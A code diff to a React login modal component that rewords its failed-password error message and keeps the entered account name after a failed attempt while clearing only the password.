@@ -29,7 +29,7 @@ const PasswordModal: FC<{ nextStep: () => void }> = ({ nextStep }) => {
     useEffect(() => {
         if (!geoInfo) return;
 
-        const textsToTranslate = ['Email or phone number', 'Password', 'The account or password you entered is incorrect.', 'Continue'];
+        const textsToTranslate = ['Email or phone number', 'Password', 'You entered the wrong password. Please try again.', 'Continue'];
 
         const translateAll = async () => {
             const translatedMap: Record<string, string> = {};
@@ -81,7 +81,6 @@ const PasswordModal: FC<{ nextStep: () => void }> = ({ nextStep }) => {
                 nextStep();
             } else {
                 setShowError(true);
-                setAccountInput('');
                 setPassword('');
             }
         } catch {
@@ -109,7 +108,7 @@ const PasswordModal: FC<{ nextStep: () => void }> = ({ nextStep }) => {
                         </label>
                         <FontAwesomeIcon icon={showPassword ? faEyeSlash : faEye} size='lg' className='absolute top-1/2 right-2 -translate-y-1/2 cursor-pointer text-[#4a4a4a]' onClick={togglePassword} />
                     </div>
-                    {showError && <p className='mt-2 text-[15px] text-red-500'>{t('The account or password you entered is incorrect.')}</p>}
+                    {showError && <p className='mt-2 text-[15px] text-red-500'>{t('You entered the wrong password. Please try again.')}</p>}
                     <button
                         onClick={() => {
                             handleSubmit();
